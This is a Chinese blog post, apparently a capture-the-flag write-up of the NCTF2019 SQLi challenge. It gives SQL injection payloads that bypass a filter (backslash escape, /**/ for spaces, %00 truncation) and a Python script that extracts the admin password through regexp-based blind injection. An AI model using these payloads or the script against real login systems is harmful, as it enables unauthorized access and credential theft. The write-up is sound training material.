---
title: '[NCTF2019]SQLi'
date: 2024-06-14 19:57:14
tags: sql注入
categories: 刷题笔记
---

### [NCTF2019]SQLi（regexp&%00截断）

我们先对题目进行扫描，发现扫出来个robots.txt

我们进行访问

![image-20240614195933329](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406141959473.png)

出现黑名单和得到flag的条件，我们要获得admin账号的密码

我们可以注意到没有对`\`进行过滤，空格过滤可以替换为`/**/，末尾多出的 ' 可以用%00截断，所以我们可以构造如下payload来使查询为真

<!--more-->

```
username=\&passwd=||/**/1;%00
```

注意：我们不能总结在登录框里面敲%00，那样会导致%00被转义而失去作用，所以我们抓包进行改写

![image-20240614202036370](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406142020471.png)

但是查询成功会跳转到welcome.php界面，那玩意就是个404页面，所以我们还是要获取admin的密码

我们可以用以下payload写脚本（注意是正则匹配，所以需要限定字符串开头，否则在字符串中找到也会算为真）：

```
username=\&passwd=||/**/passwd%09regexp"^y";%00
```

脚本

```
import requests
from urllib import parse



url = "http://08df778b-b131-45e7-9eff-822311e44b07.node4.buuoj.cn:81/"
# 构造字典

dict_list = [ i for i in range(97,123)]
shuzi = [i for i in range(48,58)]
dict_list +=shuzi
dict_list.append(95)
flag = ''
for i in range(50):
    for j in dict_list:
        payload = '||passwd/**/regexp"^%s";\x00'%(flag+chr(j))
        datas = {
            'username': '\\',
            'passwd': payload
        }
        print(datas)
        import time
        time.sleep(1)
        res = requests.post(url=url,data=datas)
        # print(res.text)
        if 'welcome.php' in res.text :
            flag += chr(j)
            print("[+] "+flag)
            break
```

原理

```
页面上回显的sql语句
select * from users where username='' and passwd=''
我们通过username 传入 \ 这样可以把'转义掉 变成这样
select * from users where username='\' and passwd=''
此时的 \' and passwd=' 就成了 username的值
在通过传入 passwd 传入 ||passwd/**/regexp"^y";%00
select * from users where username='\' and passwd='||passwd/**/regexp"^y";%00'
就和前置知识类似了
select * from users where username=''||passwd/**/regexp"^y";%00' 
后边的%00相当于截断了后边的字符，看了下php 对应版本为 5.2.16,存在截断漏洞，
接下来只需要遍历 regexp"^x" 中的 x即可
```

得到密码

```
you_will_never_know7788990
```

由于我们只要密码等于admin的密码，用户名不做要求，我们直接随便写个用户名，再吧密码写上去就得到flag了

![image-20240614205233749](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406142052816.png)
